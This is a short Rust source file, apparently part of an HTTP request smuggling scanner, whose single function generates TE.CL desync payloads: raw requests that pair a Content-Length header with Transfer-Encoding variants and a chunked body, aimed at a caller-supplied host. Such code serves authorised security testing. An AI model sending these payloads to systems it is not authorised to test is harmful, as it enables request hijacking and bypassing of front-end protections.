use super::{format_cookies, format_custom_headers, te_variations::get_te_header_variations};

/// Generate TE.CL (Transfer-Encoding vs Content-Length) attack payloads
pub fn get_te_cl_payloads(
    path: &str,
    host: &str,
    method: &str,
    custom_headers: &[String],
    cookies: &[String],
) -> Vec<String> {
    let te_headers = get_te_header_variations();

    let mut payloads = Vec::with_capacity(te_headers.len());
    let custom_header_str = format_custom_headers(custom_headers);
    let cookie_str = format_cookies(cookies);

    for te_header in &te_headers {
        payloads.push(format!(
            "{} {} HTTP/1.1\r\n\
             Host: {}\r\n\
             Connection: keep-alive\r\n\
             {}\
             {}\
             Content-Length: 4\r\n\
             {}\r\n\
             \r\n\
             1\r\n\
             A\r\n\
             0\r\n\
             \r\n",
            method, path, host, custom_header_str, cookie_str, te_header
        ));
    }
    payloads
}
